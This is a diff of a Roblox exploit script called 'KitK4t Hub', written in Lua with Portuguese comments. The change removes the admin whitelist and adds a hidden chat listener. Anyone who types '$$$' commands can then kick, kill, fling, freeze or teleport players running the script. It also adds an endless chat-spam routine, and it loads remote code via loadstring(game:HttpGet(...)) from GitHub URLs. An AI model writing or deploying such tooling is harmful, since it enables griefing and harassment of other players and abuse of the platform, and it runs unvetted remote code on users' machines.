@@ -1,78 +1,44 @@
--- Serviços
 local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- Nicks autorizados
-local Donos = {"Breno010L","itz_kadu22","Gabriel263633j","shawnlovebazuka"}
-local Moderadores = {"saitama9rsm","RUANRODRIGO121121"}
-
--- Retorna cargo
-local function GetCargo(nome)
-    if table.find(Donos,nome) then return "Dono" end
-    if table.find(Moderadores,nome) then return "Moderador" end
-    return nil
-end
-
--- ================= TAGS =================
-local function CreateTag(player)
-    local cargo = GetCargo(player.Name)
-    if not cargo then return end
-
-    local function applyTag(char)
-        local head = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
-        if not head then return end
-        if head:FindFirstChild("KitK4tTag") then return end
-
-        local billboard = Instance.new("BillboardGui")
-        billboard.Name = "KitK4tTag"
-        billboard.Adornee = head
-        billboard.Size = UDim2.new(0,200,0,50)
-        billboard.StudsOffset = Vector3.new(0,3,0)
-        billboard.AlwaysOnTop = true
-        billboard.Parent = head
-
-        local textLabel = Instance.new("TextLabel")
-        textLabel.Size = UDim2.new(1,0,1,0)
-        textLabel.BackgroundTransparency = 1
-        textLabel.TextScaled = true
-        textLabel.TextWrapped = true
-        textLabel.Text = cargo.." do KitK4t Hub"
-        textLabel.TextColor3 = cargo=="Dono" and Color3.fromRGB(255,0,0) or Color3.fromRGB(0,170,255)
-        textLabel.TextStrokeTransparency = 0
-        textLabel.TextStrokeColor3 = Color3.new(0,0,0)
-        textLabel.Font = Enum.Font.GothamBold
-        textLabel.Parent = billboard
+-- Envia comandos via chat
+local function SendCommandMessage(command, target)
+    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if channel then
+        local msg = "$$$" .. command
+        if target then msg = msg .. " " .. target end
+        channel:SendAsync(msg)
+    else
+        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
+            .SayMessageRequest:FireServer("$$$" .. command .. (target and (" " .. target) or ""), "All")
     end
-
-    if player.Character then applyTag(player.Character) end
-    player.CharacterAdded:Connect(applyTag)
 end
 
-for _,plr in ipairs(Players:GetPlayers()) do CreateTag(plr) end
-Players.PlayerAdded:Connect(CreateTag)
-
--- ================= FUNÇÕES =================
+-- Obter personagem
 local function GetCharacter(playerName)
     local plr = Players:FindFirstChild(playerName)
     return plr and plr.Character or nil
 end
 
-local loopKill = false
-
+-- Funções de comandos
 local function Kick(playerName)
-    if playerName==LocalPlayer.Name then LocalPlayer:Kick("Você foi removido pelo KitK4t Hub.") end
+    if playerName == LocalPlayer.Name then
+        LocalPlayer:Kick("Você foi removido pelo KitK4t Hub.")
+    end
 end
 
+local loopKill = false
 local function LoopKill(playerName)
-    if playerName==LocalPlayer.Name then
+    if playerName == LocalPlayer.Name then
         loopKill = not loopKill
         if loopKill then
             task.spawn(function()
                 while loopKill do
-                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                        LocalPlayer.Character.Humanoid.Health = 0
+                    if LocalPlayer.Character then
+                        local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
+                        if hum then hum.Health = 0 end
                     end
                     task.wait(0.3)
                 end
@@ -82,15 +48,15 @@ local function LoopKill(playerName)
 end
 
 local function KillPlus(playerName)
-    if playerName==LocalPlayer.Name then
+    if playerName == LocalPlayer.Name then
         local char = GetCharacter(LocalPlayer.Name)
         if char then
             char:BreakJoints()
             local root = char:FindFirstChild("HumanoidRootPart")
             if root then
-                for i=1,10 do
+                for i = 1, 10 do
                     local part = Instance.new("Part")
-                    part.Size = Vector3.new(10,10,10)
+                    part.Size = Vector3.new(10, 10, 10)
                     part.Anchored = false
                     part.CanCollide = false
                     part.Material = Enum.Material.Neon
@@ -99,10 +65,10 @@ local function KillPlus(playerName)
                     part.Parent = workspace
 
                     local bv = Instance.new("BodyVelocity")
-                    bv.Velocity = Vector3.new(math.random(-50,50),math.random(20,80),math.random(-50,50))
-                    bv.MaxForce = Vector3.new(1e5,1e5,1e5)
+                    bv.Velocity = Vector3.new(math.random(-50, 50), math.random(20, 80), math.random(-50, 50))
+                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                     bv.Parent = part
-                    game.Debris:AddItem(part,3)
+                    game.Debris:AddItem(part, 3)
                 end
             end
         end
@@ -110,78 +76,175 @@ local function KillPlus(playerName)
 end
 
 local function Fling(playerName)
-    if playerName==LocalPlayer.Name and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        local tween = TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(2,Enum.EasingStyle.Linear), {CFrame=CFrame.new(50000,5000000,3972823)})
-        tween:Play()
+    if playerName == LocalPlayer.Name then
+        local char = GetCharacter(LocalPlayer.Name)
+        if char then
+            local root = char:FindFirstChild("HumanoidRootPart")
+            if root then
+                local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
+                local tween = TweenService:Create(root, tweenInfo, {CFrame = CFrame.new(50000, 5000000, 3972823)})
+                tween:Play()
+            end
+        end
     end
 end
 
 local function Freeze(playerName)
-    if playerName==LocalPlayer.Name and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        LocalPlayer.Character.HumanoidRootPart.Anchored = true
+    if playerName == LocalPlayer.Name then
+        local char = LocalPlayer.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            char.HumanoidRootPart.Anchored = true
+        end
     end
 end
 
 local function UnFreeze(playerName)
-    if playerName==LocalPlayer.Name and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        LocalPlayer.Character.HumanoidRootPart.Anchored = false
+    if playerName == LocalPlayer.Name then
+        local char = LocalPlayer.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            char.HumanoidRootPart.Anchored = false
+        end
     end
 end
 
 local function Bring(playerName)
     local target = Players:FindFirstChild(playerName)
-    local localChar = LocalPlayer.Character
-    if not target or not target.Character or not localChar then return end
-
-    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
-    local localRoot = localChar:FindFirstChild("HumanoidRootPart")
-    if not targetRoot or not localRoot then return end
-
-    targetRoot.CFrame = localRoot.CFrame + Vector3.new(0,3,0)
+    if target and target.Character and LocalPlayer.Character then
+        local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
+        local localRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if targetRoot and localRoot then
+            targetRoot.CFrame = localRoot.CFrame + Vector3.new(0, 3, 0)
+        end
+    end
 end
 
 local function Verifique()
-    print("Verifique executado!") -- Aqui você pode adicionar a função real
+    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if channel then
+        channel:SendAsync("KitK4t_" .. math.random(1000, 9999))
+    end
 end
 
 local function TimeoutRoblox()
-    print("TimeoutRoblox executado!") -- Aqui você pode adicionar a função real
+    task.spawn(function()
+        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        while true do
+            if channel then channel:SendAsync("##########") end
+            task.wait(0)
+        end
+    end)
 end
 
--- ================= KAVO UI =================
-local Kavo = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Kavo-UI-Library/main/source.lua"))()
-local cargoLocal = GetCargo(LocalPlayer.Name) or "Player"
-local Window = Kavo.CreateLib("KitK4t Hub - "..cargoLocal,"DarkTheme")
-local Tab = Window:NewTab("Principal")
-local Section = Tab:NewSection("Comandos")
+-- ⚙️ Função para processar qualquer chat $$$ comando
+local function HandleChatCommand(text)
+    if not text or type(text) ~= "string" then return end
+    if string.sub(text, 1, 3) == "$$$" then
+        local args = string.split(text, " ")
+        local command = string.lower(string.sub(args[1], 4))
+        local target = args[2]
 
-local SelectedPlayer
-local function GetPlayersList()
-    local list = {}
-    for _,plr in ipairs(Players:GetPlayers()) do
-        if plr~=LocalPlayer then table.insert(list,plr.Name) end
-    end
-    return list
-end
-
-SelectedPlayer = GetPlayersList()[1]
-local dropdown = Section:NewDropdown("Selecionar Jogador", GetPlayersList(), function(val) SelectedPlayer = val end)
-Players.PlayerAdded:Connect(function() dropdown:Refresh(GetPlayersList()) end)
-Players.PlayerRemoving:Connect(function() dropdown:Refresh(GetPlayersList()) end)
-
-local function ExecuteCommand(cmd)
-    if cmd=="kick" then Kick(SelectedPlayer)
-    elseif cmd=="loopkill" then LoopKill(SelectedPlayer)
-    elseif cmd=="killplus" then KillPlus(SelectedPlayer)
-    elseif cmd=="fling" then Fling(SelectedPlayer)
-    elseif cmd=="freeze" then Freeze(SelectedPlayer)
-    elseif cmd=="unfreeze" then UnFreeze(SelectedPlayer)
-    elseif cmd=="bring" then Bring(SelectedPlayer)
-    elseif cmd=="verifique" then Verifique()
-    elseif cmd=="timeoutroblox" then TimeoutRoblox()
+        if command == "kick" then Kick(target) end
+        if command == "loopkill" then LoopKill(target) end
+        if command == "killplus" then KillPlus(target) end
+        if command == "fling" then Fling(target) end
+        if command == "freeze" then Freeze(target) end
+        if command == "unfreeze" then UnFreeze(target) end
+        if command == "bring" then Bring(target) end
+        if command == "verifique" then Verifique() end
+        if command == "timeoutroblox" then TimeoutRoblox() end
     end
 end
 
-for _,cmd in ipairs({"kick","loopkill","killplus","fling","freeze","unfreeze","bring","verifique","timeoutroblox"}) do
-    Section:NewButton(cmd,"Executar "..cmd,function() ExecuteCommand(cmd) end)
+-- 🔥 Compatível com novo e antigo sistema de chat
+pcall(function()
+    TextChatService.MessageReceived:Connect(function(message)
+        if message and message.Text then
+            HandleChatCommand(message.Text)
+        end
+    end)
+end)
+
+for _, plr in ipairs(Players:GetPlayers()) do
+    plr.Chatted:Connect(HandleChatCommand)
 end
+Players.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(HandleChatCommand)
+end)
+
+-- 🧭 Painel Rayfield
+task.delay(2, function()
+    local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua"))()
+
+    local Window = Rayfield:CreateWindow({
+        Name = "KitK4t Hub - Admin Painel",
+        LoadingTitle = "Script Secreto de Administradores",
+        LoadingSubtitle = "by Bazuka",
+        KeySystem = true,
+        KeySettings = {
+            Title = "Se já abriu, ignore isso",
+            Subtitle = "Não é necessário inserir key novamente.",
+            Note = "© KitK4t Hub Developers 2025",
+            FileName = "KitK4tKey",
+            SaveKey = true,
+            Key = "0000-batata-frita"
+        }
+    })
+
+    local MainTab = Window:CreateTab("Principal", 4483362458)
+
+    local function GetPlayersList()
+        local list = {}
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer then
+                table.insert(list, plr.Name)
+            end
+        end
+        return list
+    end
+
+    local playerList = GetPlayersList()
+    local SelectedPlayer = playerList[1]
+
+    local PlayerDropdown = MainTab:CreateDropdown({
+        Name = "Selecionar Jogador",
+        Options = playerList,
+        CurrentOption = SelectedPlayer,
+        MultiSelection = false,
+        Flag = "DropdownPlayers",
+        Callback = function(Value)
+            SelectedPlayer = Value
+        end
+    })
+
+    Players.PlayerAdded:Connect(function()
+        PlayerDropdown:Refresh(GetPlayersList())
+    end)
+    Players.PlayerRemoving:Connect(function()
+        PlayerDropdown:Refresh(GetPlayersList())
+    end)
+
+    local commands = {
+        {Name=";kick", Command="kick"},
+        {Name=";loopkill", Command="loopkill"},
+        {Name=";killplus", Command="killplus"},
+        {Name=";fling", Command="fling"},
+        {Name=";freeze", Command="freeze"},
+        {Name=";unfreeze", Command="unfreeze"},
+        {Name=";bring", Command="bring"},
+        {Name=";verifique", Command="verifique"},
+        {Name=";timeoutroblox", Command="timeoutroblox"}
+    }
+
+    for _, cmd in ipairs(commands) do
+        MainTab:CreateButton({
+            Name = cmd.Name,
+            Callback = function()
+                if cmd.Command == "verifique" or cmd.Command == "timeoutroblox" then
+                    SendCommandMessage(cmd.Command)
+                else
+                    SendCommandMessage(cmd.Command, SelectedPlayer)
+                end
+            end
+        })
+    end
+end)
